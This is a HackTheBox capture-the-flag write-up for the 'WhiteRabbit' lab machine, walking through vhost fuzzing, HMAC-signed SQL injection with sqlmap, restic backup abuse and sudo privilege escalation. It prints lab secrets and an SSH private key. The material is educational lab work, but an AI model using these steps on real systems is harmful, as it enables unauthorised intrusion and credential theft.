# HackTheBox - WhiteRabbit Writeup

Dificulty: **Insane**  
IP: `10.10.11.63`

---

## Enum

### Inicial Recon
I started with a Fuzzing at the VHosts with `ffuf`:

```bash
 :: Method           : GET
 :: URL              : http://10.10.11.63/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

[Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 231ms]
| URL | http://10.10.11.63/
| --> | /dashboard
    * FUZZ: status
```

Which revealed this subdomain:

```
status.whiterabbit.htb --> Redirect to  /dashboard
```

Added to `/etc/hosts`:
```
10.10.11.63   whiterabbit.htb status.whiterabbit.htb
```

---

## Web exploitation

### Access to  `status.whiterabbit.htb`
A aplicação apresenta um painel em `/dashboard`. Após análise, identificamos que se trata de um painel protegido que contém pistas relacionadas à enumeração de endpoints.
The application show a pannel at `/dashboard`. After investigating, I realized it a protected pannel that contains clues to endpoint enumerations. Here we have this endpoint:`http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`, where we receive the information of a vulnerability at the n8n workflow with gophishing.
Here, we receive a example of a parameter we can use later: 
```
  {
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
```

### Directory/Endpoint Fuzzing
This webhook performed user validation using an email field in the POST body — a possible SQL injection (SQLi) point. However, it required an x-gophish-signature header containing an HMAC-SHA256 signature of the body.

### Finding the HMAC Secret
The same Wiki.js post provided a link to a JSON file:

gophish_to_phishing_score_database.json
Reading:

http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.js
We extracted the HMAC Secret from the source:
3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS
We used CyberChef to generate valid HMAC signatures for payloads like:

{
  "campaign_id": 2,
  "email": "test\"",
  "message": "Clicked Link"
}
This returned MySQL syntax errors, confirming SQL injection.

### Automating the Attack: Burp + SQLMap
To automate signature generation, we used a modified Burp Suite extension:


# Custom HMAC appending logic (modified)
Secret = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
_hmac = hmac.new(Secret, content, digestmod=hashlib.sha256).hexdigest()
We then used sqlmap with Burp proxy to dump the temp.command_log table:

```
sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d \
  --method POST --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Linka"}' \
  -p email --proxy http://127.0.0.1:8080/ --batch --dump --level=5 --risk=3 -D temp -T command_log
📜 Data Dump: command_log Table

+----+---------------------+-------------------------------------------------------------+
| ID | Timestamp           | Command                                                     |
+----+---------------------+-------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                    |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb    |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd      |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                        |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                               |
| 6  | 2024-08-30 14:40:42 | /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+-------------------------------------------------------------+
```
We noted a password generator used to reset a user password — something to revisit later.

### Targeting the Restic Backup
From the command logs, we identified a Restic repo:


http://75951e6ff.whiterabbit.htb

We also found the password:
ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw
Using these, we interacted with the repo:


```
󰣇 ~/Documentos/whiterabbitHTB ❯ export RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw                     3.13.3  01:13 
export RESTIC_REPOSITORY=rest:http://75951e6ff.whiterabbit.htb

󰣇 ~/Documentos/whiterabbitHTB ❯ restic snapshots                                                            3.13.3  01:13 

repository 5b26a938 opened (version 2, compression level auto)
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 21:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
```

```

󰣇 shm/bob/ssh ❯ 7z x bob.7z                                                                                          01:17 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=pt_BR.UTF-8 Threads:8 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password:1q2w3e4r5t6y

Everything is Ok
```

```
󰣇 shm/bob/ssh ❯ ssh -i bob bob@whiterabbit.htb -p 2222                                                               01:18 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62
bob@ebdce80611e9:~$ ls
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
bob@ebdce80611e9:~$ sudo restic init -r.
enter password for new repository: 
enter password again: 
created restic repository 22fe5dbf4f at .

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
bob@ebdce80611e9:~$ sudo restic -r . backup /root/
enter password for repository: 
repository 22fe5dbf opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files


Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.601 KiB stored)

processed 4 files, 3.865 KiB in 0:00
snapshot a9a5706f saved
bob@ebdce80611e9:~$ sudo restic -r . ls latest
enter password for repository: 
repository 22fe5dbf opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot a9a5706f of [/root] filtered by [] at 2025-08-12 04:19:24.784798617 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
bob@ebdce80611e9:~$ sudo restic -r . dump latest /root/morpheus
enter password for repository: 
repository 22fe5dbf opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
bob@ebdce80611e9:~$ 
```
```
󰣇 ~/Documentos/whiterabbitHTB ❯ nvim morpheus_key
󰣇 ~/Documentos/whiterabbitHTB ❯ chmod 600 morpheus_key

󰣇 ~/Documentos/whiterabbitHTB ❯ ssh -i morpheus_key morpheus@whiterabbit.htb -p 22

Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Aug 12 04:24:33 2025 from 10.10.15.14
morpheus@whiterabbit:~$  
```
### Flags
By now I achieved the user flag, the root one gave a bit more of work, I had to bruteforce some passwords for the "neo" user, where I found the root.txt after running the sudo su comand.
TIP: People used python to create a bruteforce script at this part, but I found less dificulties writing one in C.
